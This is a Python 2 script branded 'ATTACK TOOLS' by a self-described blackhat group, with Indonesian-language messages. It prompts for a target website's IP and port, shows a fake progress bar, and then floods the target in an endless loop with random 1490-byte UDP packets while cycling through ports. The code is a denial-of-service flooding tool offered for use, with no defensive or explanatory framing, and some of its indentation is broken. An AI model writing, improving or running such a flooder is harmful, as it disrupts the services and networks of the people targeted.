import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet ATTACK TOOLS")
print
    print "=================================================="
    print "= AUTHOR       : MATAELANG CYBER BLACKHAT"
    print "= YT AUTHOR    : ATRYXZOFCLONE"
    print "ORGANISASI     : BLACKHAT REPUBLIK INDONESIA"
    print "=================================================="
print
ip = raw_input("IP WEBSITE  : ")
port = input("PORT WEBSITE  : ")

os.system("clear")
os.system("screenfetch -A CentOS")
print "Loading Database Paket..."
time.sleep(3)
print "Selesai"
os.system("clear")
os.system("figlet Mengirimkan Paket ")
print "[                    ] 0% "
time.sleep(2)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(2)
print "[===============     ] 75%"
time.sleep(3)
print "[====================] 100%"
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Mengirimkan %s Paket Shoope %s Ke Website : %s"%(sent,ip,port)
     if port == 65534:
       port = 1
